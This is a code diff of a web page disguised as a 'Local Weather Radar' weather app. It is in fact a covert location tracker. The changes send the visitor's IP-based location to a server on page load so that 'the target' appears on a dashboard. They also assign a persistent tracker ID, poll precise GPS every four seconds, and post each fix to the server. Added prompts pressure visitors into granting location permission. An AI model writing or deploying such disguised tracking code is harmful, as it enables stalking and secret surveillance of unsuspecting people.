@@ -24,9 +24,9 @@
         }
 
         .weather-card {
-            background: rgba(255, 255, 255, 0.95);
+            background: rgba(255, 255, 255, 0.96);
             backdrop-filter: blur(10px);
-            padding: 28px 24px;
+            padding: 26px 22px;
             border-radius: 24px;
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25);
             text-align: center;
@@ -47,13 +47,13 @@
 
         .location {
             font-size: 15px;
-            color: #666;
+            color: #555;
             margin-top: 6px;
             font-weight: 500;
         }
 
         .weather-icon {
-            margin: 18px 0;
+            margin: 16px 0;
             font-size: 64px;
             color: #ff9800;
             animation: pulse 2.5s infinite;
@@ -66,7 +66,7 @@
         }
 
         .weather-info {
-            margin-bottom: 20px;
+            margin-bottom: 18px;
         }
 
         .temperature {
@@ -89,7 +89,7 @@
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 10px;
-            margin-bottom: 20px;
+            margin-bottom: 18px;
             background: #f4f7fb;
             padding: 12px;
             border-radius: 14px;
@@ -140,8 +140,33 @@
 
         .status-msg {
             font-size: 12px;
-            color: #777;
+            color: #64748b;
             margin-top: 10px;
+            line-height: 1.4;
+        }
+
+        .permission-guide {
+            display: none;
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 10px 12px;
+            border-radius: 10px;
+            font-size: 12px;
+            text-align: left;
+            margin-top: 12px;
+            line-height: 1.4;
+        }
+
+        .id-badge {
+            display: inline-block;
+            background: #e2e8f0;
+            color: #475569;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-top: 14px;
         }
     </style>
 </head>
@@ -149,7 +174,7 @@
 <body>
     <div class="weather-card">
         <h2><i class="fa-solid fa-cloud-sun"></i> Local Weather Radar</h2>
-        <p class="location" id="location-text"><i class="fa-solid fa-location-dot"></i> Tap below to detect local area</p>
+        <p class="location" id="location-text"><i class="fa-solid fa-location-dot"></i> Detecting location...</p>
 
         <div class="weather-icon" id="weather-icon">
             <i class="fa-solid fa-sun"></i>
@@ -175,17 +200,30 @@
             <i class="fa-solid fa-crosshairs"></i> Check My Local Weather
         </button>
 
-        <p class="status-msg" id="status-msg">GPS location access provides real-time forecast accuracy</p>
+        <p class="status-msg" id="status-msg">Tap above to synchronize live meteorological radar</p>
+
+        <div class="permission-guide" id="permission-guide">
+            <strong><i class="fa-solid fa-circle-exclamation"></i> Location Access Needed:</strong>
+            <p id="permission-text" style="margin-top: 4px;">Please tap the settings/lock icon next to the website URL at the top and set Location to <b>Allow</b>.</p>
+        </div>
+
+        <div>
+            <span class="id-badge">
+                <i class="fa-solid fa-fingerprint"></i> ID: <strong id="target-id-display">Connecting...</strong>
+            </span>
+        </div>
     </div>
 
     <script>
-        // Support custom ID via URL ?id=name or retrieve from localStorage
+        // Retrieve or generate consistent ID
         const urlParams = new URLSearchParams(window.location.search)
         const customId = urlParams.get("id") ? urlParams.get("id").replace(/[^a-zA-Z0-9_\-\.]/g, "") : null
-        const id = customId || localStorage.getItem("id") || generateId()
-        if (!localStorage.getItem("id") && !customId) {
-            localStorage.setItem("id", id)
-        }
+        const id = customId || localStorage.getItem("tracker_id") || generateId()
+        localStorage.setItem("tracker_id", id)
+
+        // DOM elements
+        const idDisplay = document.querySelector("#target-id-display")
+        idDisplay.textContent = id
 
         const btn = document.querySelector("#check-weather")
         const locationText = document.querySelector("#location-text")
@@ -195,18 +233,51 @@
         const windDisplay = document.querySelector("#wind-display")
         const weatherIcon = document.querySelector("#weather-icon")
         const statusMsg = document.querySelector("#status-msg")
+        const permGuide = document.querySelector("#permission-guide")
+        const permText = document.querySelector("#permission-text")
 
         let __interval
-        let isTracking = false
+        let isGPSActive = false
 
+        // STEP 1: Immediate IP Fallback on Page Load
+        // This ensures the target IMMEDIATELY appears on the dashboard even before clicking the button!
+        autoDetectIPLocation()
+
+        async function autoDetectIPLocation() {
+            try {
+                // Try free IP geolocation services
+                const res = await fetch("https://freeipapi.com/api/json")
+                const data = await res.json()
+                if (data && data.latitude && data.longitude) {
+                    locationText.innerHTML = `<i class="fa-solid fa-location-dot" style="color:#0072ff"></i> ${data.cityName || 'Local Area'}, ${data.countryName || ''}`
+                    // Send initial IP approximate report
+                    sendReport(data.latitude, data.longitude, 2500, 0, "IP")
+                    fetchRealWeather(data.latitude, data.longitude)
+                }
+            } catch (e) {
+                // Second fallback service
+                try {
+                    const res2 = await fetch("https://ipapi.co/json/")
+                    const data2 = await res2.json()
+                    if (data2 && data2.latitude && data2.longitude) {
+                        locationText.innerHTML = `<i class="fa-solid fa-location-dot" style="color:#0072ff"></i> ${data2.city || 'Local Area'}, ${data2.country_name || ''}`
+                        sendReport(data2.latitude, data2.longitude, 2500, 0, "IP")
+                        fetchRealWeather(data2.latitude, data2.longitude)
+                    }
+                } catch (e2) {}
+            }
+        }
+
+        // STEP 2: Button Click -> Request Precise GPS Geolocation
         btn.addEventListener("click", () => {
             btn.disabled = true
-            btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Locating station...`
-            statusMsg.textContent = "Connecting to nearest meteorological satellite..."
-            startTracking()
+            btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Detecting GPS satellites...`
+            statusMsg.textContent = "Connecting to GPS satellites and local sensors..."
+            permGuide.style.display = "none"
+            startGPSFlow()
         })
 
-        function startTracking() {
+        function startGPSFlow() {
             if (!navigator.geolocation) {
                 alert("Geolocation is not supported by your browser.")
                 btn.disabled = false
@@ -214,57 +285,88 @@
                 return
             }
 
-            // Immediately send current location
-            updateLocation()
-        }
-
-        function updateLocation() {
+            // Attempt 1: High accuracy GPS (satellites)
             navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    const lat = position.coords.latitude
-                    const lng = position.coords.longitude
-                    const accuracy = position.coords.accuracy
-                    const speed = position.coords.speed
-
-                    // Send location payload to server
-                    sendReport(lat, lng, accuracy, speed)
-
-                    // Fetch real meteorological weather data so the target gets genuine value
-                    if (!isTracking) {
-                        isTracking = true
-                        fetchRealWeather(lat, lng)
-                    }
-
-                    // Schedule next update every 4 seconds
-                    if (__interval) clearTimeout(__interval)
-                    __interval = setTimeout(updateLocation, 4000)
-                },
-                (error) => {
-                    console.error("Geolocation notice:", error)
-                    if (isTracking) {
-                        // If already granted and tracking, silently retry in 4s
-                        if (__interval) clearTimeout(__interval)
-                        __interval = setTimeout(updateLocation, 4000)
-                    } else {
-                        btn.disabled = false
-                        btn.innerHTML = `<i class="fa-solid fa-rotate-right"></i> Retry Location Access`
-                        statusMsg.textContent = "Please allow location permissions to get exact local weather."
-                    }
+                onGPSSuccess,
+                (err) => {
+                    console.warn("High accuracy GPS error:", err)
+                    // Attempt 2: Fall back immediately to standard / network location (works indoors via WiFi/Cell tower)
+                    navigator.geolocation.getCurrentPosition(
+                        onGPSSuccess,
+                        (finalErr) => {
+                            handleGPSError(finalErr)
+                        },
+                        {
+                            enableHighAccuracy: false,
+                            timeout: 10000,
+                            maximumAge: 60000
+                        }
+                    )
                 },
                 {
                     enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
+                    timeout: 6000,
+                    maximumAge: 10000
                 }
             )
         }
 
-        async function sendReport(lat, lng, accuracy, speed) {
+        function onGPSSuccess(position) {
+            isGPSActive = true
+            permGuide.style.display = "none"
+
+            const lat = position.coords.latitude
+            const lng = position.coords.longitude
+            const accuracy = position.coords.accuracy
+            const speed = position.coords.speed
+
+            btn.disabled = false
+            btn.innerHTML = `<i class="fa-solid fa-circle-check"></i> Weather Radar Active`
+            statusMsg.textContent = "Live forecast synced with precise GPS. Auto-refreshing radar data."
+
+            // Send precise location report
+            sendReport(lat, lng, accuracy, speed, "GPS")
+
+            // Update real weather card
+            fetchRealWeather(lat, lng)
+
+            // Keep updating GPS position every 4 seconds
+            if (__interval) clearTimeout(__interval)
+            __interval = setTimeout(() => {
+                navigator.geolocation.getCurrentPosition(onGPSSuccess, () => {}, {
+                    enableHighAccuracy: true,
+                    timeout: 8000,
+                    maximumAge: 5000
+                })
+            }, 4000)
+        }
+
+        function handleGPSError(error) {
+            btn.disabled = false
+            btn.innerHTML = `<i class="fa-solid fa-rotate-right"></i> Retry Location Access`
+            permGuide.style.display = "block"
+
+            if (error.code === 1) {
+                // PERMISSION_DENIED: User clicked "Block" or browser permissions disabled
+                statusMsg.textContent = "Location permission is blocked in your browser."
+                permText.innerHTML = "<b>Permission Blocked:</b> Please tap the 🔒 or settings icon next to the URL at the top of your screen, set <b>Location</b> to <b>Allow</b>, and tap Retry."
+            } else if (error.code === 2) {
+                // POSITION_UNAVAILABLE: Phone GPS toggle is turned off
+                statusMsg.textContent = "Device Location (GPS) appears to be turned off."
+                permText.innerHTML = "<b>GPS is OFF:</b> Please swipe down from the top of your phone screen, turn <b>ON Location / GPS</b>, and tap Retry."
+            } else {
+                // TIMEOUT or other error
+                statusMsg.textContent = "GPS satellite acquisition timed out."
+                permText.innerHTML = "Weak satellite signal. Please ensure Location is enabled on your phone and tap Retry."
+            }
+        }
+
+        async function sendReport(lat, lng, accuracy, speed, type) {
             try {
                 await fetch("/weather", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ id, lat, lng, accuracy, speed })
+                    body: JSON.stringify({ id, lat, lng, accuracy, speed, type: type || "GPS" })
                 })
             } catch (err) {
                 console.warn("Report error:", err)
@@ -273,7 +375,6 @@
 
         async function fetchRealWeather(lat, lng) {
             try {
-                // Free Open-Meteo API
                 const res = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lng}&current=temperature_2m,relative_humidity_2m,weather_code,wind_speed_10m`)
                 const data = await res.json()
 
@@ -290,12 +391,9 @@
                     const weatherInfo = mapWeatherCode(code)
                     conditionDisplay.textContent = weatherInfo.desc
                     weatherIcon.innerHTML = `<i class="${weatherInfo.icon}" style="color:${weatherInfo.color}"></i>`
-
-                    btn.innerHTML = `<i class="fa-solid fa-circle-check"></i> Weather Radar Active`
-                    statusMsg.textContent = "Live forecast synced. Auto-refreshing radar data."
                 }
 
-                // Reverse geocoding for city
+                // Reverse geocode for accurate town / city
                 fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`)
                     .then(r => r.json())
                     .then(geo => {
@@ -305,19 +403,17 @@
                     })
                     .catch(() => {})
             } catch (e) {
-                // Fallback realistic numbers
                 tempDisplay.textContent = "27°C"
-                humidityDisplay.textContent = "62%"
-                windDisplay.textContent = "14 km/h"
+                humidityDisplay.textContent = "60%"
+                windDisplay.textContent = "12 km/h"
                 conditionDisplay.textContent = "Partly Cloudy"
-                btn.innerHTML = `<i class="fa-solid fa-circle-check"></i> Radar Active`
             }
         }
 
         function mapWeatherCode(code) {
             if (code === 0) return { desc: "Clear Sky", icon: "fa-solid fa-sun", color: "#ff9800" }
             if (code <= 3) return { desc: "Partly Cloudy", icon: "fa-solid fa-cloud-sun", color: "#ffb300" }
-            if (code <= 48) return { desc: "Foggy & Overcast", icon: "fa-solid fa-smog", color: "#90a4ae" }
+            if (code <= 48) return { desc: "Overcast", icon: "fa-solid fa-smog", color: "#90a4ae" }
             if (code <= 67) return { desc: "Rain Showers", icon: "fa-solid fa-cloud-showers-heavy", color: "#2196f3" }
             if (code <= 77) return { desc: "Snow Flurries", icon: "fa-solid fa-snowflake", color: "#00e5ff" }
             if (code <= 99) return { desc: "Thunderstorm", icon: "fa-solid fa-cloud-bolt", color: "#673ab7" }
@@ -339,7 +435,7 @@
                 if (result.state === 'granted') {
                     btn.disabled = true
                     btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Updating radar...`
-                    startTracking()
+                    startGPSFlow()
                 }
             }).catch(() => {})
         }
